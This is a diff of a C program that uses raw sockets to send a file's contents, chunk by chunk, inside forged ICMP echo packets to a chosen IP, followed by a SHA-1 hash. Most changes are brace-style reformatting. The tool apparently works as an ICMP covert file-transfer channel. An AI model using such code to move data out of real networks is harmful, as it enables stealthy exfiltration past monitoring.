@@ -33,17 +33,16 @@ Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 #include <netinet/ether.h>
 #include <openssl/sha.h>
 
-unsigned short checksum (unsigned short *addr, int len)
-{
+unsigned short checksum (unsigned short *addr, int len) {
   int nleft = len;
   int sum = 0;
   unsigned short *w = addr;
   unsigned short answer = 0;
-  while (nleft > 1){
+  while (nleft > 1) {
     sum += *w++;
     nleft -= 2;
   }
-  if (nleft == 1){
+  if (nleft == 1) {
     *(unsigned char *) (&answer) = *(unsigned char *) w;
     sum += answer;
   }
@@ -53,7 +52,7 @@ unsigned short checksum (unsigned short *addr, int len)
   return (answer);
 }
 
-void fill_ip_packet(struct ip *pkt, u_short data_len, const char *src, const char *dst){
+void fill_ip_packet(struct ip *pkt, u_short data_len, const char *src, const char *dst) {
   struct in_addr addr;
   inet_pton(AF_INET, dst, &addr);
   pkt->ip_v = 4;
@@ -71,7 +70,7 @@ void fill_ip_packet(struct ip *pkt, u_short data_len, const char *src, const cha
   pkt->ip_sum = checksum((unsigned short *) pkt, sizeof(struct ip));
 }
 
-void fill_icmp_packet(struct icmp *pkt, u_int16_t id, unsigned const char *payload, size_t payload_len, size_t icmp_len){
+void fill_icmp_packet(struct icmp *pkt, u_int16_t id, unsigned const char *payload, size_t payload_len, size_t icmp_len) {
   pkt->icmp_type = ICMP_ECHO;
   pkt->icmp_code = 0;
   pkt->icmp_id = id;
@@ -84,12 +83,12 @@ void fill_icmp_packet(struct icmp *pkt, u_int16_t id, unsigned const char *paylo
   pkt->icmp_cksum = checksum((unsigned short *) pkt, icmp_len);
 }
 
-void usage(){
-  fprintf(stderr, "Usage: ./bin [-he] <-d ip> <-f <filename>>\n");
+void usage() {
+  fprintf(stderr, "Usage: ./bin [-hrc] [-d ip] [-f filename] [-i interval] [-s source]\n");
   exit(EXIT_SUCCESS);
 }
 
-int main (int argc, char **argv){
+int main (int argc, char **argv) {
   char *dst_ip = NULL;
   char *src_ip = NULL;
   char *filename = NULL;
@@ -120,7 +119,7 @@ int main (int argc, char **argv){
   unsigned long long whole_file_len = 0;
   u_short payload_len;
 
-  while ((opt = getopt(argc, argv, "hrd:cf:i:s:")) != -1) {
+  while ((opt = getopt(argc, argv, "hrcd:f:i:s:")) != -1) {
     switch (opt) {
     case 'f':
       filename = optarg;
@@ -146,30 +145,30 @@ int main (int argc, char **argv){
       usage();
     }
   }
-  if (!dst_ip || (!filename && !exec_mode)){
+  if (!dst_ip || (!filename && !exec_mode)) {
     usage();
   }
 
-  if ((whole_file = malloc(WHOLE_FILE_LEN)) == NULL){
+  if ((whole_file = malloc(WHOLE_FILE_LEN)) == NULL) {
     perror("malloc");
     exit(1);
   }
-  if ((sock_eth = socket (AF_INET, SOCK_PACKET, htons (ETH_P_ALL))) < 0){
+  if ((sock_eth = socket (AF_INET, SOCK_PACKET, htons (ETH_P_ALL))) < 0) {
     perror ("socket");
     exit(1);
   }
-  if ((sock_icmp = socket (AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0){
+  if ((sock_icmp = socket (AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
     perror ("socket");
     exit(1);
   }
-  if ((ret = setsockopt (sock_icmp, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one))) < 0){
+  if ((ret = setsockopt (sock_icmp, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one))) < 0) {
     perror("setsockopt");
     exit(1);
   }
 
-  if (!exec_mode){
-    if (filename){
-      if ((fd = open(filename, O_RDONLY)) == -1){
+  if (!exec_mode) {
+    if (filename) {
+      if ((fd = open(filename, O_RDONLY)) == -1) {
         perror("open");
         exit(1);
       }
@@ -192,21 +191,21 @@ int main (int argc, char **argv){
 
   memset(whole_file, 0, WHOLE_FILE_LEN);
   do { 
-    if (expect_response && started){
-      //ret = recv(sock_eth, buf_incoming, sizeof (buf_incoming), 0);
+    if (expect_response && started) {
+      ret = recv(sock_eth, buf_incoming, sizeof (buf_incoming), 0);
     }
     memset(payload, 0, sizeof(payload));
-    if ((ret = read(fd, payload, sizeof(payload))) == -1){
+    if ((ret = read(fd, payload, sizeof(payload))) == -1) {
       perror("read");
       exit(1);
     }
-    if (ret == 0){// End of file, send payload-end delimiter '.'
+    if (ret == 0) {// End of file, send payload-end delimiter '.'
       payload[0] = '\0';
       payload_len = 0;
       done = 1;
     }else{// Gather next bit of file
       payload_len = ret;
-      if (pos + payload_len > WHOLE_FILE_LEN){
+      if (pos + payload_len > WHOLE_FILE_LEN) {
         whole_file = realloc(whole_file, WHOLE_FILE_LEN + pos + payload_len);
         whole_file_len = pos + payload_len;
       }else{
@@ -219,8 +218,7 @@ int main (int argc, char **argv){
     fill_ip_packet(ip_hdr_out, payload_len, src_ip, dst_ip);
     ip_len = ntohs(ip_hdr_out->ip_len);
     icmp_len = ip_len - sizeof(struct iphdr);
-      fill_icmp_packet(icmp_hdr_out, icmp_hdr_in->icmp_id, payload, payload_len, icmp_len);
-    //fill_icmp_packet(icmp_hdr_out, icmp_hdr_in, payload, payload_len, icmp_len);
+    fill_icmp_packet(icmp_hdr_out, icmp_hdr_in->icmp_id, payload, payload_len, icmp_len);
 
     dst.sin_family = AF_INET;
     dst.sin_addr.s_addr = ip_hdr_out->ip_dst.s_addr;
@@ -233,8 +231,7 @@ int main (int argc, char **argv){
   fill_ip_packet(ip_hdr_out, sizeof(sha1_hash), src_ip, dst_ip);
   ip_len = ntohs(ip_hdr_out->ip_len);
   icmp_len = ip_len - sizeof(struct iphdr);
-    fill_icmp_packet(icmp_hdr_out, icmp_hdr_in->icmp_id, sha1_hash, sizeof(sha1_hash), icmp_len);
-  //fill_icmp_packet(icmp_hdr_out, icmp_hdr_in, sha1_hash, sizeof(sha1_hash), icmp_len);
+  fill_icmp_packet(icmp_hdr_out, icmp_hdr_in->icmp_id, sha1_hash, sizeof(sha1_hash), icmp_len);
   dst.sin_family = AF_INET;
   dst.sin_addr.s_addr = ip_hdr_out->ip_dst.s_addr;
   sendto(sock_icmp, buf_outgoing, ip_len, 0, (struct sockaddr *) &dst, sizeof (dst));
